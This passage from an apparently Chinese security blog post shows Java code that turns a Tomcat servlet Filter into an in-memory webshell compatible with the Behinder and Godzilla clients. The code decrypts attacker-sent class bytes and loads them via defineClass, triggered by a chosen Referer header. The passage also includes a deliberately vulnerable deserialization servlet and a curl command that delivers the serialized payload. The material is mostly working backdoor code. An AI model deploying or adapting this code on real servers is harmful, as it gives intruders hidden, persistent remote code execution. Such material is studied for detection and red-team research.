</span></span></code></pre></div><h3 id=接入冰蝎>接入冰蝎</h3><p>只需要在我们重写的<code>doFilter</code>部分多加一个if来适配冰蝎流量的逻辑即可接入冰蝎，代码部分详细分析参见Y4er师傅的<a href=https://y4er.com/post/java-deserialization-inject-behinder-memshell-note/>Java反序列化注入冰蝎内存马相关踩坑笔记</a></p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>// omit
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#00a8c8>else</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#111>HttpServletRequest</span> <span style=color:#111>request</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>HttpServletRequest</span><span style=color:#f92672>)</span> <span style=color:#111>servletRequest</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>HttpServletResponse</span> <span style=color:#111>response</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>HttpServletResponse</span><span style=color:#f92672>)</span> <span style=color:#111>servletResponse</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>HttpSession</span> <span style=color:#111>session</span> <span style=color:#f92672>=</span> <span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#75af00>getSession</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// create pageContext
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#111>HashMap</span> <span style=color:#111>pageContext</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>HashMap</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#111>pageContext</span><span style=color:#f92672>.</span><span style=color:#75af00>put</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;request&#34;</span><span style=color:#f92672>,</span> <span style=color:#111>request</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#111>pageContext</span><span style=color:#f92672>.</span><span style=color:#75af00>put</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;response&#34;</span><span style=color:#f92672>,</span> <span style=color:#111>response</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#111>pageContext</span><span style=color:#f92672>.</span><span style=color:#75af00>put</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;session&#34;</span><span style=color:#f92672>,</span> <span style=color:#111>session</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span><span style=color:#f92672>(</span><span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#75af00>getMethod</span><span style=color:#f92672>().</span><span style=color:#75af00>equals</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;POST&#34;</span><span style=color:#f92672>)){</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 这里的判断条件可自行修改
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#00a8c8>if</span><span style=color:#f92672>(</span><span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#75af00>getHeader</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Referer&#34;</span><span style=color:#f92672>).</span><span style=color:#75af00>equalsIgnoreCase</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;https://www.baidu.com/&#34;</span><span style=color:#f92672>)){</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>try</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                <span style=color:#111>String</span> <span style=color:#111>k</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;e45e329feb5d925b&#34;</span><span style=color:#f92672>;</span>	<span style=color:#75715e>// default: pass=beyond, k=md5(pass)[:16]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#111>session</span><span style=color:#f92672>.</span><span style=color:#75af00>putValue</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;u&#34;</span><span style=color:#f92672>,</span> <span style=color:#111>k</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>                <span style=color:#111>Cipher</span> <span style=color:#111>c</span> <span style=color:#f92672>=</span> <span style=color:#111>Cipher</span><span style=color:#f92672>.</span><span style=color:#75af00>getInstance</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;AES&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>                <span style=color:#111>c</span><span style=color:#f92672>.</span><span style=color:#75af00>init</span><span style=color:#f92672>(</span><span style=color:#111>2</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#111>SecretKeySpec</span><span style=color:#f92672>(</span><span style=color:#111>k</span><span style=color:#f92672>.</span><span style=color:#75af00>getBytes</span><span style=color:#f92672>(),</span> <span style=color:#d88200>&#34;AES&#34;</span><span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#111>Method</span> <span style=color:#111>method</span> <span style=color:#f92672>=</span> <span style=color:#111>Class</span><span style=color:#f92672>.</span><span style=color:#75af00>forName</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;java.lang.ClassLoader&#34;</span><span style=color:#f92672>).</span><span style=color:#75af00>getDeclaredMethod</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;defineClass&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>byte</span><span style=color:#f92672>[].</span><span style=color:#75af00>class</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>int</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>int</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>                <span style=color:#111>method</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>byte</span><span style=color:#f92672>[]</span> <span style=color:#111>evilclass_byte</span> <span style=color:#f92672>=</span> <span style=color:#111>c</span><span style=color:#f92672>.</span><span style=color:#75af00>doFinal</span><span style=color:#f92672>(</span><span style=color:#00a8c8>new</span> <span style=color:#111>sun</span><span style=color:#f92672>.</span><span style=color:#75af00>misc</span><span style=color:#f92672>.</span><span style=color:#75af00>BASE64Decoder</span><span style=color:#f92672>().</span><span style=color:#75af00>decodeBuffer</span><span style=color:#f92672>(</span><span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#75af00>getReader</span><span style=color:#f92672>().</span><span style=color:#75af00>readLine</span><span style=color:#f92672>()));</span>
</span></span><span style=display:flex><span>                <span style=color:#111>Class</span> <span style=color:#111>evilclass</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>Class</span><span style=color:#f92672>)</span> <span style=color:#111>method</span><span style=color:#f92672>.</span><span style=color:#75af00>invoke</span><span style=color:#f92672>(</span><span style=color:#00a8c8>this</span><span style=color:#f92672>.</span><span style=color:#75af00>getClass</span><span style=color:#f92672>().</span><span style=color:#75af00>getClassLoader</span><span style=color:#f92672>(),</span> <span style=color:#111>evilclass_byte</span><span style=color:#f92672>,</span> <span style=color:#111>0</span><span style=color:#f92672>,</span> <span style=color:#111>evilclass_byte</span><span style=color:#f92672>.</span><span style=color:#75af00>length</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>                <span style=color:#111>evilclass</span><span style=color:#f92672>.</span><span style=color:#75af00>newInstance</span><span style=color:#f92672>().</span><span style=color:#75af00>equals</span><span style=color:#f92672>(</span><span style=color:#111>pageContext</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>return</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span><span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>Exception</span> <span style=color:#111>e</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>                <span style=color:#75715e>// e.printStackTrace();
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>写一个反序列化接口来测试一下效果</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.servlet.ServletException</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.servlet.annotation.WebServlet</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.servlet.http.HttpServlet</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.servlet.http.HttpServletRequest</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.servlet.http.HttpServletResponse</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.*</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>@WebServlet</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;/cc&#34;</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>CCServlet</span> <span style=color:#00a8c8>extends</span> <span style=color:#111>HttpServlet</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>@Override</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>protected</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>doGet</span><span style=color:#f92672>(</span><span style=color:#111>HttpServletRequest</span> <span style=color:#111>req</span><span style=color:#f92672>,</span> <span style=color:#111>HttpServletResponse</span> <span style=color:#111>resp</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>ServletException</span><span style=color:#f92672>,</span> <span style=color:#111>IOException</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>InputStream</span> <span style=color:#111>inputStream</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>InputStream</span><span style=color:#f92672>)</span> <span style=color:#111>req</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#111>ObjectInputStream</span> <span style=color:#111>objectInputStream</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ObjectInputStream</span><span style=color:#f92672>(</span><span style=color:#111>inputStream</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>objectInputStream</span><span style=color:#f92672>.</span><span style=color:#75af00>readObject</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>ClassNotFoundException</span> <span style=color:#111>e</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>e</span><span style=color:#f92672>.</span><span style=color:#75af00>printStackTrace</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#111>resp</span><span style=color:#f92672>.</span><span style=color:#75af00>getWriter</span><span style=color:#f92672>().</span><span style=color:#75af00>write</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Success&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>@Override</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>protected</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>doPost</span><span style=color:#f92672>(</span><span style=color:#111>HttpServletRequest</span> <span style=color:#111>req</span><span style=color:#f92672>,</span> <span style=color:#111>HttpServletResponse</span> <span style=color:#111>resp</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>ServletException</span><span style=color:#f92672>,</span> <span style=color:#111>IOException</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>InputStream</span> <span style=color:#111>inputStream</span> <span style=color:#f92672>=</span> <span style=color:#111>req</span><span style=color:#f92672>.</span><span style=color:#75af00>getInputStream</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>ObjectInputStream</span> <span style=color:#111>objectInputStream</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ObjectInputStream</span><span style=color:#f92672>(</span><span style=color:#111>inputStream</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>objectInputStream</span><span style=color:#f92672>.</span><span style=color:#75af00>readObject</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>ClassNotFoundException</span> <span style=color:#111>e</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>e</span><span style=color:#f92672>.</span><span style=color:#75af00>printStackTrace</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#111>resp</span><span style=color:#f92672>.</span><span style=color:#75af00>getWriter</span><span style=color:#f92672>().</span><span style=color:#75af00>write</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Success&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>先编译TomcatInject.java，再运行CC11Template，生成的ser文件就是最终payload</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># 虽然我把三梦师傅的TomcatEcho和TomcatInject和在一起了 但注意数据包仍然需要发送两次</span>
</span></span><span style=display:flex><span>curl <span style=color:#d88200>&#34;http://127.0.0.1:8088/cc&#34;</span> --data-binary <span style=color:#d88200>&#34;@./cc11Test4.ser&#34;</span>
</span></span></code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220602204040825.png alt=image-20220602204040825></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220602204148346.png alt=image-20220602204148346></p><h3 id=接入哥斯拉>接入哥斯拉</h3><p>哥斯拉的流量比冰蝎的简单多了，加密内容在参数pass中 以post方式发出，详细分析参见Y4er师傅的<a href=https://y4er.com/post/solve-the-problem-of-godzilla-memory-shell-pagecontext/>解决哥斯拉内存马pagecontext的问题</a></p><p>继续融入我们原本的filter，代码如下</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>// omit
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#00a8c8>else</span> <span style=color:#00a8c8>if</span><span style=color:#f92672>(</span><span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#75af00>getHeader</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Referer&#34;</span><span style=color:#f92672>).</span><span style=color:#75af00>equalsIgnoreCase</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;https://www.sohu.com/&#34;</span><span style=color:#f92672>)){</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// default: pass=pass, key=key, xc=md5(key)[:16]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#111>String</span> <span style=color:#111>pass</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;pass&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#111>String</span> <span style=color:#111>xc</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;3c6e0b8a9c15224a&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#111>String</span> <span style=color:#111>md5</span> <span style=color:#f92672>=</span> <span style=color:#111>md5</span><span style=color:#f92672>(</span><span style=color:#111>pass</span> <span style=color:#f92672>+</span> <span style=color:#111>xc</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>out</span><span style=color:#f92672>.</span><span style=color:#75af00>println</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;here&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>byte</span><span style=color:#f92672>[]</span> <span style=color:#111>data</span> <span style=color:#f92672>=</span> <span style=color:#111>base64Decode</span><span style=color:#f92672>(</span><span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#75af00>getParameter</span><span style=color:#f92672>(</span><span style=color:#111>pass</span><span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>        <span style=color:#111>data</span> <span style=color:#f92672>=</span> <span style=color:#111>x</span><span style=color:#f92672>(</span><span style=color:#111>data</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>false</span><span style=color:#f92672>,</span> <span style=color:#111>xc</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span><span style=color:#f92672>(</span><span style=color:#00a8c8>this</span><span style=color:#f92672>.</span><span style=color:#75af00>payload</span> <span style=color:#f92672>==</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>){</span>	<span style=color:#75715e>// 在类中提前声明 `Class payload;`
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#111>URLClassLoader</span> <span style=color:#111>urlClassLoader</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>URLClassLoader</span><span style=color:#f92672>(</span><span style=color:#00a8c8>new</span> <span style=color:#111>URL</span><span style=color:#f92672>[</span><span style=color:#111>0</span><span style=color:#f92672>],</span> <span style=color:#111>Thread</span><span style=color:#f92672>.</span><span style=color:#75af00>currentThread</span><span style=color:#f92672>().</span><span style=color:#75af00>getContextClassLoader</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>            <span style=color:#111>Method</span> <span style=color:#111>defMethod</span> <span style=color:#f92672>=</span> <span style=color:#111>ClassLoader</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>.</span><span style=color:#75af00>getDeclaredMethod</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;defineClass&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>byte</span><span style=color:#f92672>[].</span><span style=color:#75af00>class</span><span style=color:#f92672>,</span> <span style=color:#111>Integer</span><span style=color:#f92672>.</span><span style=color:#75af00>TYPE</span><span style=color:#f92672>,</span> <span style=color:#111>Integer</span><span style=color:#f92672>.</span><span style=color:#75af00>TYPE</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>defMethod</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>this</span><span style=color:#f92672>.</span><span style=color:#75af00>payload</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>Class</span><span style=color:#f92672>)</span><span style=color:#111>defMethod</span><span style=color:#f92672>.</span><span style=color:#75af00>invoke</span><span style=color:#f92672>(</span><span style=color:#111>urlClassLoader</span><span style=color:#f92672>,</span> <span style=color:#111>data</span><span style=color:#f92672>,</span> <span style=color:#111>0</span><span style=color:#f92672>,</span> <span style=color:#111>data</span><span style=color:#f92672>.</span><span style=color:#75af00>length</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span><span style=color:#00a8c8>else</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>ByteArrayOutputStream</span> <span style=color:#111>arrOut</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ByteArrayOutputStream</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            <span style=color:#111>Object</span> <span style=color:#111>f</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>this</span><span style=color:#f92672>.</span><span style=color:#75af00>payload</span><span style=color:#f92672>.</span><span style=color:#75af00>newInstance</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            <span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#75af00>equals</span><span style=color:#f92672>(</span><span style=color:#111>arrOut</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#75af00>equals</span><span style=color:#f92672>(</span><span style=color:#111>data</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#75af00>equals</span><span style=color:#f92672>(</span><span style=color:#111>request</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>response</span><span style=color:#f92672>.</span><span style=color:#75af00>getWriter</span><span style=color:#f92672>().</span><span style=color:#75af00>write</span><span style=color:#f92672>(</span><span style=color:#111>md5</span><span style=color:#f92672>.</span><span style=color:#75af00>substring</span><span style=color:#f92672>(</span><span style=color:#111>0</span><span style=color:#f92672>,</span> <span style=color:#111>16</span><span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>            <span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#75af00>toString</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            <span style=color:#111>response</span><span style=color:#f92672>.</span><span style=color:#75af00>getWriter</span><span style=color:#f92672>().</span><span style=color:#75af00>write</span><span style=color:#f92672>(</span><span style=color:#111>base64Encode</span><span style=color:#f92672>(</span><span style=color:#111>x</span><span style=color:#f92672>(</span><span style=color:#111>arrOut</span><span style=color:#f92672>.</span><span style=color:#75af00>toByteArray</span><span style=color:#f92672>(),</span> <span style=color:#00a8c8>true</span><span style=color:#f92672>,</span> <span style=color:#111>xc</span><span style=color:#f92672>)));</span>
</span></span><span style=display:flex><span>            <span style=color:#111>response</span><span style=color:#f92672>.</span><span style=color:#75af00>getWriter</span><span style=color:#f92672>().</span><span style=color:#75af00>write</span><span style=color:#f92672>(</span><span style=color:#111>md5</span><span style=color:#f92672>.</span><span style=color:#75af00>substring</span><span style=color:#f92672>(</span><span style=color:#111>16</span><span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span><span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>Exception</span> <span style=color:#111>e</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>        <span style=color:#111>e</span><span style=color:#f92672>.</span><span style=color:#75af00>printStackTrace</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>涉及到的几个编码工具方法</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>byte</span><span style=color:#f92672>[]</span> <span style=color:#75af00>base64Decode</span><span style=color:#f92672>(</span><span style=color:#111>String</span> <span style=color:#111>bs</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>byte</span><span style=color:#f92672>[]</span> <span style=color:#111>value</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>Class</span> <span style=color:#111>base64</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>base64</span> <span style=color:#f92672>=</span> <span style=color:#111>Class</span><span style=color:#f92672>.</span><span style=color:#75af00>forName</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;java.util.Base64&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Object</span> <span style=color:#111>decoder</span> <span style=color:#f92672>=</span> <span style=color:#111>base64</span><span style=color:#f92672>.</span><span style=color:#75af00>getMethod</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;getDecoder&#34;</span><span style=color:#f92672>,</span> <span style=color:#f92672>(</span><span style=color:#111>Class</span><span style=color:#f92672>[])</span><span style=color:#00a8c8>null</span><span style=color:#f92672>).</span><span style=color:#75af00>invoke</span><span style=color:#f92672>(</span><span style=color:#111>base64</span><span style=color:#f92672>,</span> <span style=color:#f92672>(</span><span style=color:#111>Object</span><span style=color:#f92672>[])</span><span style=color:#00a8c8>null</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>value</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#00a8c8>byte</span><span style=color:#f92672>[])((</span><span style=color:#00a8c8>byte</span><span style=color:#f92672>[])</span><span style=color:#111>decoder</span><span style=color:#f92672>.</span><span style=color:#75af00>getClass</span><span style=color:#f92672>().</span><span style=color:#75af00>getMethod</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;decode&#34;</span><span style=color:#f92672>,</span> <span style=color:#111>String</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>).</span><span style=color:#75af00>invoke</span><span style=color:#f92672>(</span><span style=color:#111>decoder</span><span style=color:#f92672>,</span> <span style=color:#111>bs</span><span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>Exception</span> <span style=color:#111>var6</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>base64</span> <span style=color:#f92672>=</span> <span style=color:#111>Class</span><span style=color:#f92672>.</span><span style=color:#75af00>forName</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;sun.misc.BASE64Decoder&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>Object</span> <span style=color:#111>decoder</span> <span style=color:#f92672>=</span> <span style=color:#111>base64</span><span style=color:#f92672>.</span><span style=color:#75af00>newInstance</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            <span style=color:#111>value</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#00a8c8>byte</span><span style=color:#f92672>[])((</span><span style=color:#00a8c8>byte</span><span style=color:#f92672>[])</span><span style=color:#111>decoder</span><span style=color:#f92672>.</span><span style=color:#75af00>getClass</span><span style=color:#f92672>().</span><span style=color:#75af00>getMethod</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;decodeBuffer&#34;</span><span style=color:#f92672>,</span> <span style=color:#111>String</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>).</span><span style=color:#75af00>invoke</span><span style=color:#f92672>(</span><span style=color:#111>decoder</span><span style=color:#f92672>,</span> <span style=color:#111>bs</span><span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>Exception</span> <span style=color:#111>e</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>e</span><span style=color:#f92672>.</span><span style=color:#75af00>printStackTrace</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>return</span> <span style=color:#111>value</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
